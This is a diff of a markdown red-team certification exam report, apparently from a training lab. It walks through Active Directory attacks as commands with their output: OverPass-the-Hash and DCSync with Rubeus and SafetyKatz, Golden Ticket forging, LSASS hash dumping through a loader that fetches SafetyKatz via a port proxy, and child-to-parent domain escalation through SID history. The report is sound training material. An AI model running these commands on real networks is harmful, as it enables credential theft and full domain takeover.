@@ -1,6 +1,6 @@
-# Attacker Machine (`studvm`)
+# Certified Red Team Professional (CRTP)
 
-## ???
+## Certification Exam Report Structure
 
 ### Domain Enumeration
 
@@ -2189,13 +2189,13 @@ SID               : S-1-5-18
 
 ---
 
-### Domain Persistence
+### Domain Lateral Movement | OverPass-The-Hash + DCSync (with Rubeus)
 
-#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+14) **OverPass-The-Hash and DCSync for Domain Lateral Movement** (successful ✅)
 
-![Run as administrator](learning_objectives_run_as_administrator.png)
+Description: Executed **DCSync** attack on **tech\administrator** and **tech\krbtgt** using **Rubeus** and **SafetyKatz** to extract **Kerberos keys** (including AES-256) and **NTLM hashes**. The successful retrieval of these credentials enables **domain lateral movement** and **privilege escalation**. The **tech\krbtgt** credentials are useful for **Golden Ticket** attacks, while the **tech\administrator** credentials provide administrative access to the domain, facilitating further exploitation.
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -2258,22 +2258,6 @@ Cached Tickets: (1)
         Session Key Type: AES-256-CTS-HMAC-SHA1-96
         Cache Flags: 0x1 -> PRIMARY
         Kdc Called:
-```
-
-`winrs -r:dbserver31.tech.finance.corp cmd`:
-```
-Winrs error:Access is denied.
-```
-❌
-
-`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
-```
-[SNIP]
-```
-
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:tech\krbtgt" "exit"`:
-```
-
 ```
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" "exit"`:
@@ -2402,14 +2386,17 @@ Supplemental Credentials:
 
 [SNIP]
 ```
+🚩
 
 ---
 
-#### Domain Persistence | Golden Ticket + DCSync
+#### Domain Persistence | Golden Ticket (with Rubeus)
 
-![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+15) **Golden Ticket Attack for Domain Persistence** (successful ✅)
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+Description: Leveraged the **AES-256 Kerberos key** extracted for `tech\administrator` to forge a **Golden Ticket** for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting **administrator-level access** to the domain. This technique allows **domain persistence**, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.
+
+![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -2456,7 +2443,7 @@ Supplemental Credentials:
 
 ![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -2500,7 +2487,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![tech-dc | administrator](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+![tech-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -2532,18 +2519,21 @@ Authentication authority asserted identity  Well-known group S-1-18-1           
 TECH\Denied RODC Password Replication Group Alias            S-1-5-21-1325336202-3661212667-302732393-572 Mandatory group, Enabled by default, Enabled group, Local Group
 Mandatory Label\High Mandatory Level        Label            S-1-16-12288
 ```
+🚩
 
 ---
 
 ### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-???
+16) **Credential Extraction for Domain Lateral Movement** (successful ✅)
 
-Description: ...
-
-`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+Description: Leveraged **SafetyKatz** to extract **NTLM hashes** from **LSASS memory** on `tech-dc.tech.finance.corp`. Extracted credentials include the **NTLM hashes** of high-privileged accounts such as `Administrator` and `krbtgt`. These credentials can be used for **domain lateral movement**, **escalating privileges**, and maintaining **domain persistence**.
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
+
+![tech-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
 ```
@@ -2617,16 +2607,19 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 [SNIP]
 ```
+🚩
 
 ---
 
-### Cross Trust Attacks
+### Cross Trust Attacks | Child Domain `krbtgt` Kerberos Key Abuse (with PowerView, Rubeus, SafetyKatz)
 
-#### Cross Trust Attacks - Child Domain `krbtgt` Key Hash Abuse + DCSync
+17) **Child Domain `krbtgt` Kerberos Key Abuse for Domain Privilege Escalation and Lateral Movement** (successful ✅)
 
-- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**
+Description: Abused the child domain `krbtgt` TGT encryption key from `tech.finance.corp` to forge a **Golden Ticket** that includes the **Enterprise Admin** SID in its **SID History**. Leveraging this forged ticket enabled **cross-domain privilege escalation** and domain **lateral movement**, ultimately granting **administrative access** on `finance-dc.finance.corp` and facilitating further exploitation within the **root domain**.
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+- **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
+
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -2679,6 +2672,8 @@ S-1-5-21-1712611810-3596029332-2671080496-519📌
 [+] Ticket successfully imported!🎟️
 ```
 
+- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**
+
 `klist`:
 ```
 Current LogonId is 0:0x13e557
@@ -2726,7 +2721,7 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-![finance-dc | administrator](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+![finance-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `set username`:
 ```
@@ -2739,9 +2734,19 @@ COMPUTERNAME=FINANCE-DC🖥️
 ```
 🚩
 
-`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+---
+
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
+
+18) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+
+Description: Extracted the **NTLM hashes** of all the domain accounts from **LSASS memory** on `finance-dc.finance.corp`. These credentials can be leveraged for **lateral movement** and further privilege escalation within the **root domain**.
+
+![finance-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
+
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
 ```
@@ -2759,14 +2764,14 @@ NTLM : 58ce52a1d25fff985d061827fc475535🔑
 [SNIP]
 
 RID  : 000001f6 (502)
-User : krbtgt
+User : krbtgt👤
 LM   :
-NTLM : 449b7acf3ddeef577218e66df19510de
+NTLM : 449b7acf3ddeef577218e66df19510de🔑
 
 RID  : 000003e8 (1000)
-User : FINANCE-DC$
+User : FINANCE-DC$👤
 LM   :
-NTLM : d3d27180dea3670873238d414ef9bcbf
+NTLM : d3d27180dea3670873238d414ef9bcbf🔑
 
 RID  : 0000044f (1103)
 User : TECH$
@@ -2776,136 +2781,6 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 [SNIP]
 ```
 🚩
-
----
-
-### AD Certificate Services Abuse
-
-#### AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)
-
-- **Find ESC1 Vulnerable Certificate Templates**
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
-
-`C:\AD\Tools\Certify.exe cas`:
-```
-[SNIP]
-
-[*] Action: Find certificate authorities
-[*] Using the search base 'CN=Configuration,DC=finance,DC=corp'
-
-
-[*] Root CAs
-
-
-
-[*] NTAuthCertificates - Certificates that enable authentication:
-
-
-[!] Unhandled Certify exception:
-
-System.DirectoryServices.DirectoryServicesCOMException (0x80072030): There is no such object on the server.
-
-[SNIP]
-```
-❌
-
-`certutil -config - -ping`:
-```
-No active Certification Authorities found: No more data is available. 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
-CertUtil: -ping command FAILED: 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
-CertUtil: No more data is available.
-```
-❌
-
-`certutil -dump`:
-```
-CertUtil: -dump command completed successfully.
-```
-❌
-
----
-
-#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
-
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
-`Import-Module C:\AD\Tools\PowerView.ps1`
-
-`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'studentuser'}`:
-```
-```
-❌
-
-`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'sqlserversync'}`:
-```
-AceQualifier           : AccessAllowed
-ObjectDN               : DC=tech,DC=finance,DC=corp
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set📑
-ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-IdentityName           : TECH\sqlserversync👤
-
-AceQualifier           : AccessAllowed
-ObjectDN               : DC=tech,DC=finance,DC=corp
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : DS-Replication-Get-Changes📑
-ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-IdentityName           : TECH\sqlserversync👤
-
-AceQualifier           : AccessAllowed
-ObjectDN               : DC=tech,DC=finance,DC=corp
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : DS-Replication-Get-Changes-All📑
-ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-IdentityName           : TECH\sqlserversync👤
-```
-
-???
 
 ---
 ---
